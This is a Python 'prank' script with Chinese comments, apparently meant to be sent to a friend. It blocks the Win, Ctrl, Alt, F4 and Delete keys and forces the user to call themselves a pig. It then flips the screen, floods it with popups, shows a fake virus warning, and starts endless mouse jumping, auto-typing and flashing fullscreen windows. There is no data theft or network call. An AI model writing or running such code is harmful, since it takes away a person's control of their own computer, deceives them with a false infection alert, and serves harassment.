# ！！！代码最终由AI重构，且注释均为AI添加，读起来会有些死板！！！
# 作者：P_71ang 转载请标明来源
import tkinter as tk
import webbrowser
import random
import threading
import time
import os
import pyautogui
import pygame
import sys
import platform
from tkinter import messagebox
import ctypes
import keyboard

# 初始化 pygame 用于播放音效
pygame.mixer.init()

def resource_path(relative_path):
    """获取打包后的资源路径"""
    try:
        base_path = sys._MEIPASS  # 打包后的临时资源目录
    except AttributeError:
        base_path = os.path.abspath(".")  # 开发环境下的当前目录
    return os.path.join(base_path, relative_path)

def show_fullscreen_message(title, message):
    # 创建一个全屏提示窗口
    message_window = tk.Toplevel()
    message_window.attributes('-fullscreen', True)  # 设置提示窗口全屏
    message_window.title(title)

    # 创建标签显示消息
    label = tk.Label(message_window, text=message, font=("Arial", 24))
    label.pack(expand=True)

    # 创建确认按钮
    button = tk.Button(
        message_window, text="确认", font=("Arial", 18), command=message_window.destroy
    )
    button.pack(pady=20)

    # 确保提示窗口始终在最前面
    message_window.grab_set()

def create_popup_windows():
    # 创建多个随机位置的弹窗
    def boom():
        window = tk.Tk()
        width = window.winfo_screenwidth()
        height = window.winfo_screenheight()
        a = random.randrange(0, width)
        b = random.randrange(0, height)
        window.title('window')
        window.geometry("250x100" + "+" + str(a) + "+" + str(b))
        tk.Label(window, text='蠢猪你好', bg='green',
                 font=('宋体', 17), width=20, height=4).pack()
        window.mainloop()

    # 使用 threading 创建多个弹窗
    threads = []
    for i in range(30):  # 弹窗数量
        t = threading.Thread(target=boom)
        threads.append(t)
        time.sleep(0.1)  # 弹窗间隔时间
        threads[i].start()

def play_sound():
    # 播放音效，循环99次
    sound_path = resource_path("t.wav")  # 使用 WAV 文件
    if os.path.exists(sound_path):
        pygame.mixer.music.load(sound_path)
        pygame.mixer.music.play(loops=98)  # 循环播放99次
    else:
        print("音频文件未找到！")

def mouse_madness():
    # 让鼠标乱飞
    while True:
        x = random.randint(0, pyautogui.size().width)
        y = random.randint(0, pyautogui.size().height)
        pyautogui.moveTo(x, y, duration=0.1)
        time.sleep(0.3)

def auto_type():
    # 自动打字
    time.sleep(5)  # 给朋友 5 秒时间切换到输入框
    while True:
        pyautogui.typewrite("你的电脑只有蓝屏才能关闭这亿个程序了", interval=0.1)
        pyautogui.press("enter")
        time.sleep(1)

def flash_screen():
    # 屏幕闪烁
    colors = ["red", "green", "blue", "yellow", "purple", "orange"]
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    label = tk.Label(root, text="蠢猪还想关机😄", font=("Arial", 50))
    label.pack(expand=True)
    while True:
        for color in colors:
            root.configure(bg=color)
            root.update()
            time.sleep(0.3)
    root.mainloop()

def flash_scree2():
    # 屏幕闪烁（不同提示）
    colors = ["red", "green", "blue", "yellow", "purple", "orange"]
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    label = tk.Label(root, text="不关机😄", font=("Arial", 50))
    label.pack(expand=True)
    while True:
        for color in colors:
            root.configure(bg=color)
            root.update()
            time.sleep(0.3)
    root.mainloop()

def block_keys():
    # 屏蔽Win键
    keyboard.block_key('windows')
    # 屏蔽Ctrl、Alt、F4、Delete
    keyboard.block_key('ctrl')
    keyboard.block_key('alt')
    keyboard.block_key('f4')
    keyboard.block_key('delete')
    # 按下Ctrl或Alt时自动按q
    keyboard.add_hotkey('ctrl', lambda: keyboard.write('q'))
    keyboard.add_hotkey('alt', lambda: keyboard.write('q'))

def main():
    # 主逻辑
    block_keys()  # 屏蔽快捷键
    answe1 = "no"   # 设置默认为no
    while answe1 == "no":  # 当answer值为no时就一直循环
        # 弹出"灵魂拷问"弹窗
        if messagebox.askquestion("灵魂拷问", "你是不是猪？") == "yes":
            messagebox.showinfo("提醒", "我也这么觉得")  # 弹出"提示窗口"
            message_box = ctypes.windll.user32.MessageBoxW
            answe1 = "yes"    # 结束循环
        else:
            # 弹出多个“你是猪”窗口
            def boom():
                window = tk.Tk()
                width = window.winfo_screenwidth()
                height = window.winfo_screenheight()
                a = random.randrange(0, width)
                b = random.randrange(0, height)
                window.title('window')
                window.geometry("250x100" + "+" + str(a) + "+" + str(b))
                tk.Label(window, text='你是猪', bg='green',
                         font=('宋体', 17), width=20, height=4).pack()
                window.mainloop()
            threads = []
            for i in range(30):
                t = threading.Thread(target=boom)
                threads.append(t)
                time.sleep(0.05)
                threads[i].start()
    answer = ""  # 初始化用户输入
    while answer != "我就是蠢猪":  # 如果用户输入不正确，则一直循环
        # 创建输入窗口
        root = tk.Tk()
        root.attributes('-fullscreen', True)  # 设置窗口全屏
        root.title("小猪测试")

        # 创建标签
        label = tk.Label(root, text="输入：我就是蠢猪，以继续", font=("Arial", 24))
        label.pack(pady=50)

        # 创建输入框
        entry = tk.Entry(root, font=("Arial", 18))
        entry.pack(pady=20)

        # 创建确认按钮
        def check_input():
            nonlocal answer
            answer = entry.get().strip()  # 获取用户输入
            if answer == "我就是蠢猪":
                root.destroy()  # 关闭输入窗口
            else:
                messagebox.showwarning("错误", "输入不正确，请重新输入！")

        button = tk.Button(root, text="确认", font=("Arial", 18), command=check_input)
        button.pack(pady=20)

        # 进入主事件循环
        root.mainloop()

    # 用户输入正确后，执行小恶搞
    if platform.system() == "Windows":
        pyautogui.hotkey("ctrl", "alt", "down")  # Windows 屏幕倒置
    else:
        os.system("display rotate inverted")  # Linux 屏幕倒置
    play_sound()  # 播放音效
    create_popup_windows()  # 无限弹窗

    # 弹窗提示电脑疑似感染病毒
    show_fullscreen_message("😅小猪提示", "电脑疑似感染病毒")
    time.sleep(2)
    # 询问用户是否关机
    res1 = messagebox.askquestion("询问用户", "是否关机,重启后可自动粉碎病毒")
    if res1 == "yes":
        # 用户选择不关机，执行大恶搞
        threading.Thread(target=mouse_madness).start()  # 鼠标乱飞
        threading.Thread(target=auto_type).start()  # 自动打字
        threading.Thread(target=flash_screen).start()  # 屏幕闪烁
    else:
        threading.Thread(target=mouse_madness).start()  # 鼠标乱飞
        threading.Thread(target=auto_type).start()  # 自动打字
        threading.Thread(target=flash_scree2).start()  # 屏幕闪烁

if __name__ == "__main__":
    main()
